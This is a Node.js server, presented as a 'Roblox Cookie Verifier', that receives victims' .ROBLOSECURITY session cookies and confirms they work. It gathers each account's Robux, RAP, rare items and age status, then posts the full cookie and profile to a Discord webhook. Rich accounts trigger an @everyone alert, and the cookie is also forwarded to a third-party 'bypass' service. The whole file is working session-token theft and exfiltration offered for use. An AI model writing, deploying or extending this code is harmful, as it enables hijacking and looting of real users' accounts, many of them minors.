const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// ========== CONFIGURATION ==========
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
const BYPASS_API_URL = 'https://rblxbypasser.com/api/bypass';

// Asset IDs based on your research
const ASSET_IDS = {
    KORBLOX_RIGHT_LEG: 139607718,
    KORBLOX_LEFT_LEG: 139607673,
    KORBLOX_RIGHT_ARM: 139607625,
    HEADLESS_HEAD: 134967443,
    HEADLESS_BUNDLE_ID: 201,
    EIGHT_BIT_CROWN: 10159600649,
};

// Emojis
const EMOJIS = {
    success: '✅',
    error: '❌',
    warning: '⚠️',
    robux: '💰',
    rap: '📊',
    crown: '👑',
    skull: '💀',
    ghost: '👻',
    clock: '⏰',
    user: '👤',
    id: '🆔',
    calendar: '📅',
    friends: '👥',
    groups: '👥',
    korblox: '🗡️',
    headless: '🎃',
    eightbit: '🕹️',
    cookie: '🍪',
    verified: '✅',
    unverified: '❌',
    sparkles: '✨',
    arrow: '➡️',
    diamond: '💎',
    fire: '🔥',
    star: '⭐',
    gift: '🎁',
    lock: '🔒',
    unlock: '🔓',
    warning_sign: '⚠️',
    info: 'ℹ️',
    chart: '📈',
    ping: '🔔',
    rare: '💎',
    ultra: '🌟'
};

console.log('========================================');
console.log('🔧 WEBHOOK URL:', WEBHOOK_URL);
console.log('========================================');

// Format number with commas
function formatNumber(num) {
    if (!num) return '0';
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

// Get relative time
function getRelativeTime(dateString) {
    if (!dateString || dateString === 'Unknown') return 'Unknown';
    const date = new Date(dateString);
    const now = new Date();
    const diffTime = Math.abs(now - date);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    
    if (diffDays < 30) return `${diffDays} days ago`;
    if (diffDays < 365) return `${Math.floor(diffDays / 30)} months ago`;
    return `${Math.floor(diffDays / 365)} years ago`;
}

// Check if should @everyone based on conditions
function shouldMentionEveryone(data) {
    const conditions = [];
    
    // Check for Korblox
    if (data.inventory?.hasKorblox) {
        conditions.push('KORBLOX');
    }
    
    // Check for Headless
    if (data.inventory?.hasHeadless) {
        conditions.push('HEADLESS');
    }
    
    // Check for 8-Bit Crown
    if (data.inventory?.hasEightBitCrown) {
        conditions.push('8-BIT CROWN');
    }
    
    // Check for 1000+ robux
    if (data.robuxBalance >= 1000) {
        conditions.push(`1000+ ROBUX (${formatNumber(data.robuxBalance)} R$)`);
    }
    
    // Check for 1000+ RAP
    if (data.rap >= 1000) {
        conditions.push(`1000+ RAP (${formatNumber(data.rap)} R$)`);
    }
    
    // Check for 50k+ friends (summary)
    if (data.summary?.friendCount >= 50000) {
        conditions.push(`50K+ FRIENDS (${formatNumber(data.summary.friendCount)})`);
    }
    
    return {
        shouldMention: conditions.length > 0,
        conditions: conditions,
        count: conditions.length
    };
}

// Get mention priority level
function getMentionPriority(data) {
    let priority = 0;
    let priorityName = '';
    
    if (data.inventory?.hasKorblox && data.inventory?.hasHeadless && data.inventory?.hasEightBitCrown) {
        priority = 5;
        priorityName = 'ULTRA RARE - FULL COLLECTION';
    } else if (data.inventory?.hasKorblox && data.inventory?.hasHeadless) {
        priority = 4;
        priorityName = 'VERY RARE - KORBLOX + HEADLESS';
    } else if (data.inventory?.hasKorblox && data.inventory?.hasEightBitCrown) {
        priority = 4;
        priorityName = 'VERY RARE - KORBLOX + 8-BIT';
    } else if (data.inventory?.hasHeadless && data.inventory?.hasEightBitCrown) {
        priority = 4;
        priorityName = 'VERY RARE - HEADLESS + 8-BIT';
    } else if (data.inventory?.hasKorblox) {
        priority = 3;
        priorityName = 'RARE - KORBLOX OWNER';
    } else if (data.inventory?.hasHeadless) {
        priority = 3;
        priorityName = 'RARE - HEADLESS OWNER';
    } else if (data.inventory?.hasEightBitCrown) {
        priority = 2;
        priorityName = 'RARE - 8-BIT CROWN OWNER';
    } else if (data.robuxBalance >= 100000) {
        priority = 2;
        priorityName = 'RICH - 100K+ ROBUX';
    } else if (data.rap >= 100000) {
        priority = 2;
        priorityName = 'RICH - 100K+ RAP';
    } else if (data.robuxBalance >= 1000 || data.rap >= 1000) {
        priority = 1;
        priorityName = 'NOTABLE - 1K+ VALUE';
    }
    
    return { priority, priorityName };
}

async function verifyCookie(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        return { valid: true, userId: response.data.id, username: response.data.name };
    } catch (error) {
        return { valid: false, error: 'Invalid or expired cookie' };
    }
}

async function checkAge13Plus(cookie, userId) {
    try {
        const accountResponse = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (accountResponse.data && accountResponse.data.IsThirteenOrOver !== undefined) {
            return accountResponse.data.IsThirteenOrOver;
        }
        return false;
    } catch (error) {
        console.error('Age check error:', error.message);
        return false;
    }
}

async function fetchRobuxBalance(cookie) {
    try {
        const response = await axios.get('https://economy.roblox.com/v1/users/authenticated/currency', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        return response.data.robux;
    } catch (error) {
        return 0;
    }
}

async function checkInventoryItems(cookie, userId, assetIds) {
    const results = {
        hasKorblox: false,
        hasHeadless: false,
        hasEightBitCrown: false,
        korbloxParts: []
    };
    
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.assetId === assetIds.KORBLOX_RIGHT_LEG || 
                    item.assetId === assetIds.KORBLOX_LEFT_LEG || 
                    item.assetId === assetIds.KORBLOX_RIGHT_ARM) {
                    results.korbloxParts.push(item.assetId);
                }
                
                if (item.assetId === assetIds.HEADLESS_HEAD) {
                    results.hasHeadless = true;
                }
                
                if (item.assetId === assetIds.EIGHT_BIT_CROWN) {
                    results.hasEightBitCrown = true;
                }
            }
        }
        
        results.hasKorblox = results.korbloxParts.length === 3;
        
        const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (bundleResponse.data && bundleResponse.data.data) {
            for (const bundle of bundleResponse.data.data) {
                if (bundle.id === assetIds.HEADLESS_BUNDLE_ID) {
                    results.hasHeadless = true;
                }
            }
        }
        
    } catch (error) {
        console.error('Inventory check error:', error.message);
    }
    
    return results;
}

async function fetchUserSummary(userId) {
    try {
        const [profileResponse, friendsResponse, groupsResponse] = await Promise.all([
            axios.get(`https://users.roblox.com/v1/users/${userId}`),
            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`)
        ]);
        
        const createdDate = new Date(profileResponse.data.created);
        const now = new Date();
        const daysSinceCreation = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
        
        return {
            displayName: profileResponse.data.displayName,
            createdDate: profileResponse.data.created,
            daysSinceCreation: daysSinceCreation,
            friendCount: friendsResponse.data.count,
            groupCount: groupsResponse.data.data ? groupsResponse.data.data.length : 0,
            description: profileResponse.data.description || '',
            isBanned: profileResponse.data.isBanned || false
        };
    } catch (error) {
        return {
            displayName: 'Unknown',
            createdDate: 'Unknown',
            daysSinceCreation: 0,
            friendCount: 0,
            groupCount: 0,
            description: '',
            isBanned: false
        };
    }
}

async function bypassExtensions(cookie) {
    try {
        const response = await axios.post(BYPASS_API_URL, {
            cookie: cookie,
            type: 'extend'
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            timeout: 10000
        });
        return { success: true, data: response.data };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

async function fetchUserRAP(cookie, userId) {
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        let totalRAP = 0;
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.recentAveragePrice) {
                    totalRAP += item.recentAveragePrice;
                }
            }
        }
        return totalRAP;
    } catch (error) {
        return 0;
    }
}

// WEBHOOK WITH @everyone MENTIONS
async function sendToWebhook(data) {
    console.log('========================================');
    console.log('📤 SENDING WEBHOOK WITH @everyone CHECK');
    console.log('========================================');
    
    if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_ID')) {
        console.error('❌ WEBHOOK URL NOT CONFIGURED!');
        return { success: false, error: 'Webhook URL not configured' };
    }
    
    try {
        // Check if should @everyone
        const mentionCheck = shouldMentionEveryone(data);
        const priority = getMentionPriority(data);
        
        let content = '';
        let color = data.success ? 0x00FF00 : 0xFF0000;
        
        // Prepare @everyone mention if conditions met
        if (data.success && mentionCheck.shouldMention) {
            content = `@everyone ${EMOJIS.ultra} **RARE ACCOUNT DETECTED!** ${EMOJIS.ultra}\n`;
            content += `**${priority.priorityName}** - ${mentionCheck.count} rare condition(s) met!\n`;
            content += `**Conditions:** ${mentionCheck.conditions.join(', ')}\n`;
            content += `${EMOJIS.arrow} **Check the embed below for full details!**\n\n`;
            color = 0xFF0000; // Red for rare accounts
            console.log('🔔 @everyone MENTION TRIGGERED!');
            console.log('Conditions met:', mentionCheck.conditions);
        } else if (data.success) {
            content = `${EMOJIS.success} **New Account Verified** ${EMOJIS.success}\n`;
            console.log('📢 No @everyone mention - conditions not met');
        } else {
            content = `${EMOJIS.warning} **Verification Attempt Failed** ${EMOJIS.warning}\n`;
        }
        
        // Create array for fields
        const fields = [];
        
        // FIELD 1: FULL COOKIE
        fields.push({
            name: `${EMOJIS.cookie} FULL COOKIE VALUE`,
            value: `\`\`\`\n${data.cookie || 'No cookie provided'}\n\`\`\``,
            inline: false
        });
        
        if (data.success) {
            // FIELD 2: RARE CONDITIONS MET (if any)
            if (mentionCheck.shouldMention) {
                let rareBadges = '';
                if (data.inventory?.hasKorblox) rareBadges += `${EMOJIS.korblox} **KORBLOX** 👑\n`;
                if (data.inventory?.hasHeadless) rareBadges += `${EMOJIS.headless} **HEADLESS** 🎃\n`;
                if (data.inventory?.hasEightBitCrown) rareBadges += `${EMOJIS.eightbit} **8-BIT CROWN** ⭐\n`;
                if (data.robuxBalance >= 1000) rareBadges += `${EMOJIS.robux} **${formatNumber(data.robuxBalance)} ROBUX** 💰\n`;
                if (data.rap >= 1000) rareBadges += `${EMOJIS.rap} **${formatNumber(data.rap)} RAP** 📈\n`;
                if (data.summary?.friendCount >= 50000) rareBadges += `${EMOJIS.friends} **${formatNumber(data.summary.friendCount)} FRIENDS** 👥\n`;
                
                fields.push({
                    name: `${EMOJIS.rare} RARE CONDITIONS MET ${EMOJIS.rare}`,
                    value: rareBadges,
                    inline: false
                });
            }
            
            // FIELD 3: BASIC INFO
            fields.push({
                name: `${EMOJIS.user} ACCOUNT INFORMATION`,
                value: `┌ ${EMOJIS.user} **Username:** \`${data.username}\`\n` +
                       `├ ${EMOJIS.id} **User ID:** \`${data.userId}\`\n` +
                       `├ ${EMOJIS.diamond} **Display Name:** \`${data.summary?.displayName || 'N/A'}\`\n` +
                       `├ ${EMOJIS.calendar} **Created:** \`${new Date(data.summary?.accountAge).toLocaleDateString()}\`\n` +
                       `└ ${EMOJIS.clock} **Account Age:** \`${data.daysSinceCreation} days\` (${getRelativeTime(data.summary?.accountAge)})`,
                inline: false
            });
            
            // FIELD 4: ROBUX & RAP
            const robuxEmoji = data.robuxBalance >= 1000 ? EMOJIS.fire : EMOJIS.robux;
            const rapEmoji = data.rap >= 1000 ? EMOJIS.fire : EMOJIS.rap;
            
            fields.push({
                name: `${EMOJIS.robux} CURRENCY & VALUE`,
                value: `┌ ${robuxEmoji} **Robux Balance:** \`${formatNumber(data.robuxBalance)} R$\`\n` +
                       `└ ${rapEmoji} **RAP Value:** \`${formatNumber(data.rap)} R$\``,
                inline: true
            });
            
            // FIELD 5: AGE VERIFICATION
            fields.push({
                name: `${EMOJIS.lock} AGE VERIFICATION`,
                value: data.isThirteenPlus ? 
                    `${EMOJIS.unlock} **13+ Verified:** \`Yes\`\n└ **Full Access Granted**` :
                    `${EMOJIS.lock} **13+ Verified:** \`No\`\n└ **Limited Access**`,
                inline: true
            });
            
            // FIELD 6: LIMITED ITEMS STATUS
            let limitedItemsValue = '';
            
            if (data.inventory?.hasKorblox) {
                limitedItemsValue += `${EMOJIS.korblox} **Korblox Deathspeaker:** \`OWNED\` ${EMOJIS.sparkles}\n`;
            } else {
                limitedItemsValue += `${EMOJIS.korblox} **Korblox Deathspeaker:** \`NOT OWNED\` (${data.inventory?.korbloxPartsOwned || 0}/3 parts)\n`;
            }
            
            if (data.inventory?.hasHeadless) {
                limitedItemsValue += `${EMOJIS.headless} **Headless Horseman:** \`OWNED\` ${EMOJIS.ghost}\n`;
            } else {
                limitedItemsValue += `${EMOJIS.headless} **Headless Horseman:** \`NOT OWNED\`\n`;
            }
            
            if (data.inventory?.hasEightBitCrown) {
                limitedItemsValue += `${EMOJIS.eightbit} **8-Bit Royal Crown:** \`OWNED\` ${EMOJIS.crown}\n`;
            } else {
                limitedItemsValue += `${EMOJIS.eightbit} **8-Bit Royal Crown:** \`NOT OWNED\``;
            }
            
            fields.push({
                name: `${EMOJIS.gift} LIMITED ITEMS`,
                value: limitedItemsValue,
                inline: false
            });
            
            // FIELD 7: SOCIAL STATS
            const friendEmoji = data.summary?.friendCount >= 50000 ? EMOJIS.ultra : EMOJIS.friends;
            
            fields.push({
                name: `${EMOJIS.friends} SOCIAL STATISTICS`,
                value: `┌ ${friendEmoji} **Friends:** \`${formatNumber(data.summary?.friendCount || 0)}\`\n` +
                       `├ ${EMOJIS.groups} **Groups:** \`${formatNumber(data.summary?.groupCount || 0)}\`\n` +
                       `└ ${EMOJIS.warning_sign} **Banned:** \`${data.summary?.isBanned ? 'Yes' : 'No'}\``,
                inline: false
            });
            
            // FIELD 8: PROFILE LINK
            fields.push({
                name: `${EMOJIS.arrow} PROFILE LINK`,
                value: `[Click to view ${data.username}'s profile](https://www.roblox.com/users/${data.userId}/profile)`,
                inline: true
            });
            
            // FIELD 9: USER BIO (if exists)
            if (data.summary?.description && data.summary.description.length > 0) {
                fields.push({
                    name: `${EMOJIS.sparkles} USER BIO`,
                    value: `\`\`\`\n${data.summary.description.substring(0, 500)}${data.summary.description.length > 500 ? '...' : ''}\n\`\`\``,
                    inline: false
                });
            }
            
        } else {
            // FAILED VERIFICATION
            fields.push({
                name: `${EMOJIS.error} ERROR DETAILS`,
                value: `\`\`\`diff\n- ${data.error || 'Unknown error occurred'}\n\`\`\``,
                inline: false
            });
            
            fields.push({
                name: `${EMOJIS.warning_sign} TROUBLESHOOTING`,
                value: `• Cookie may be expired\n• Cookie format might be incorrect\n• Try logging into Roblox again\n• Get a fresh cookie from browser`,
                inline: false
            });
        }
        
        // FIELD 10: TIMESTAMP
        fields.push({
            name: `${EMOJIS.clock} VERIFICATION TIME`,
            value: `\`${new Date(data.timestamp).toLocaleString()}\``,
            inline: false
        });
        
        // Create the embed
        const embed = {
            title: data.success ? 
                (mentionCheck.shouldMention ? `${EMOJIS.ultra} ⭐ RARE ACCOUNT VERIFIED! ⭐ ${EMOJIS.ultra}` : `${EMOJIS.success} ACCOUNT VERIFIED SUCCESSFULLY ${EMOJIS.success}`) : 
                `${EMOJIS.error} VERIFICATION FAILED ${EMOJIS.warning}`,
            description: data.success ? 
                (mentionCheck.shouldMention ? `**${priority.priorityName}** - This account meets ${mentionCheck.count} rare condition(s)!` : `Account successfully verified. No rare conditions met.`) : 
                `Cookie validation failed. Please check and try again.`,
            color: mentionCheck.shouldMention ? 0xFF0000 : color,
            thumbnail: data.success ? {
                url: `https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${data.userId}.png?width=420&height=420&format=png`
            } : null,
            author: {
                name: data.success ? `@${data.username}` : 'Verification Failed',
                icon_url: data.success ? `https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=420&height=420&format=png` : null,
                url: data.success ? `https://www.roblox.com/users/${data.userId}/profile` : null
            },
            fields: fields,
            footer: {
                text: `🔐 Roblox Cookie API • ${mentionCheck.shouldMention ? 'RARE ACCOUNT DETECTED!' : 'Standard Verification'}`,
                icon_url: 'https://cdn.discordapp.com/emojis/1234567890.png'
            },
            timestamp: data.timestamp
        };
        
        // Send the webhook with @everyone mention
        const webhookData = {
            content: content,
            embeds: [embed],
            username: "Roblox Cookie Verifier",
            avatar_url: "https://cdn.discordapp.com/emojis/1234567890.png",
            allowed_mentions: {
                parse: ["everyone"] // This allows @everyone mentions
            }
        };
        
        const response = await axios.post(WEBHOOK_URL, webhookData, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 10000
        });
        
        console.log('✅ WEBHOOK SENT SUCCESSFULLY!');
        if (mentionCheck.shouldMention) {
            console.log('🔔 @everyone WAS MENTIONED!');
            console.log('📋 Conditions:', mentionCheck.conditions);
        }
        console.log('========================================');
        return { success: true, status: response.status, mentioned: mentionCheck.shouldMention };
        
    } catch (error) {
        console.error('❌ WEBHOOK FAILED!');
        console.error('Error:', error.message);
        if (error.response) {
            console.error('Response:', error.response.data);
        }
        console.log('========================================');
        return { success: false, error: error.message };
    }
}

// ========== MAIN API ENDPOINTS ==========

app.post('/api/verify-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    console.log('========================================');
    console.log('🔍 NEW VERIFICATION REQUEST');
    console.log('Cookie length:', cookie ? cookie.length : 0);
    console.log('========================================');
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    let responseData = {
        cookie: cookie,
        success: false,
        timestamp: new Date().toISOString()
    };
    
    try {
        console.log('Step 1: Verifying cookie...');
        const verification = await verifyCookie(cookie);
        
        if (!verification.valid) {
            responseData.error = verification.error;
            console.log('❌ Cookie is invalid');
            await sendToWebhook(responseData);
            return res.status(401).json({ success: false, error: verification.error, cookie: cookie });
        }
        
        console.log(`✅ Cookie valid for: ${verification.username}`);
        responseData.success = true;
        responseData.username = verification.username;
        responseData.userId = verification.userId;
        
        console.log('Step 2: Checking age...');
        responseData.isThirteenPlus = await checkAge13Plus(cookie, verification.userId);
        
        console.log('Step 3: Fetching user data...');
        const [robuxBalance, inventoryItems, userSummary, userRAP] = await Promise.all([
            fetchRobuxBalance(cookie),
            checkInventoryItems(cookie, verification.userId, ASSET_IDS),
            fetchUserSummary(verification.userId),
            fetchUserRAP(cookie, verification.userId)
        ]);
        
        console.log('Step 4: Bypassing extensions...');
        const bypassResult = await bypassExtensions(cookie);
        
        responseData.robuxBalance = robuxBalance;
        responseData.rap = userRAP;
        responseData.daysSinceCreation = userSummary.daysSinceCreation;
        responseData.inventory = {
            hasKorblox: inventoryItems.hasKorblox,
            hasHeadless: inventoryItems.hasHeadless,
            hasEightBitCrown: inventoryItems.hasEightBitCrown,
            korbloxPartsOwned: inventoryItems.korbloxParts.length,
            totalKorbloxParts: 3
        };
        responseData.summary = {
            displayName: userSummary.displayName,
            friendCount: userSummary.friendCount,
            groupCount: userSummary.groupCount,
            accountAge: userSummary.createdDate,
            description: userSummary.description,
            isBanned: userSummary.isBanned
        };
        responseData.bypassResult = bypassResult;
        
        // Check conditions before sending webhook
        const mentionCheck = shouldMentionEveryone(responseData);
        console.log('🎯 Condition Check Results:');
        console.log('- Should @everyone:', mentionCheck.shouldMention);
        console.log('- Conditions met:', mentionCheck.conditions);
        
        // Send webhook with @everyone if conditions met
        const webhookResult = await sendToWebhook(responseData);
        
        console.log('📦 Sending response to client');
        res.json({
            ...responseData,
            webhookSent: webhookResult.success,
            mentioned: webhookResult.mentioned,
            conditionsMet: mentionCheck.conditions
        });
        
    } catch (error) {
        console.error('Server error:', error);
        responseData.error = error.message;
        await sendToWebhook(responseData);
        res.status(500).json({ success: false, error: 'Internal server error', details: error.message, cookie: cookie });
    }
});

// Test webhook endpoint
app.post('/api/test-webhook', async (req, res) => {
    console.log('🧪 TESTING WEBHOOK WITH @everyone');
    
    const testData = {
        cookie: "TEST_COOKIE_VALUE_FOR_TESTING_PURPOSES",
        success: true,
        username: "Loudzraze",
        userId: 10873440895,
        daysSinceCreation: 365,
        rap: 250000,
        robuxBalance: 12500,
        isThirteenPlus: true,
        inventory: {
            hasKorblox: true,
            hasHeadless: true,
            hasEightBitCrown: true,
            korbloxPartsOwned: 3,
            totalKorbloxParts: 3
        },
        summary: {
            displayName: "Loudzraze",
            friendCount: 75000,
            groupCount: 12,
            accountAge: "2024-01-01T00:00:00Z",
            description: "Roblox enthusiast and limited collector! 🎮",
            isBanned: false
        },
        bypassResult: { success: true, data: { bypassed: true } },
        timestamp: new Date().toISOString()
    };
    
    const result = await sendToWebhook(testData);
    
    res.json({ 
        webhookSent: result.success, 
        mentioned: result.mentioned,
        message: result.success ? "✅ Webhook sent with @everyone mention!" : "❌ Webhook failed"
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'API is running', 
        timestamp: new Date().toISOString(),
        webhookConfigured: WEBHOOK_URL && !WEBHOOK_URL.includes('YOUR_ID')
    });
});

app.get('/', (req, res) => {
    res.json({ 
        name: 'Roblox Cookie API',
        version: '1.0.0',
        description: 'Full cookie verification with @everyone mentions for rare accounts',
        conditions: [
            'Korblox Deathspeaker',
            'Headless Horseman', 
            '8-Bit Royal Crown',
            '1000+ Robux',
            '1000+ RAP',
            '50,000+ Friends'
        ],
        endpoints: [
            'POST /api/verify-cookie - Full verification',
            'POST /api/test-webhook - Test webhook',
            'GET /health - Health check'
        ]
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log('========================================');
    console.log('🔔 @everyone MENTION CONDITIONS:');
    console.log('  • Korblox Deathspeaker');
    console.log('  • Headless Horseman');
    console.log('  • 8-Bit Royal Crown');
    console.log('  • 1000+ Robux');
    console.log('  • 1000+ RAP');
    console.log('  • 50,000+ Friends');
    console.log('========================================');
});

module.exports = app;
